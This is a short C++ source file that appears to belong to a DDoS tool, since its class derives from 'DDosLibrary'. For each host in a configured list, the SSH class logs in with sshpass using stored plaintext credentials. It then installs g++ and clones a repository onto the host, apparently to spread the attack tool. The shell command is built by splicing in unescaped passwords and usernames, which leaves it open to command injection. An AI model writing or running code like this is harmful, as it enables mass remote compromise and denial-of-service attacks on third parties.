//
// Created by mao on 17-12-20.
//

#include <iostream>
#include "SSH.h"

SSH::SSH(arg_bundle args, const std::string &command) : DDosLibrary(args), command(command) {
}

void SSH::run() {
    srand(static_cast<unsigned int>(time(nullptr)));

    if (this->args.target_ip == nullptr) {
        return;
    }

    for (const ConfigLibrary::Host &host:ConfigLibrary::hosts) {
        std::cout << "Trying connect to host " << host.getHost() << std::endl;
        std::thread t(&SSH::connect, this, host);
        threads.push_back(std::move(t));
    }

    for (int j = 0; j < threads.size(); ++j) {
        threads.at(static_cast<unsigned long>(j)).join();
    }
}

void SSH::connect(const ConfigLibrary::Host &host) {
    utils::exec("sshpass -p '" + host.getPassword() + "' ssh " + host.getUserName() + "@" + host.getHost() +
                " '(apt update&&apt install g++ -y&&git clone replace)'");
}
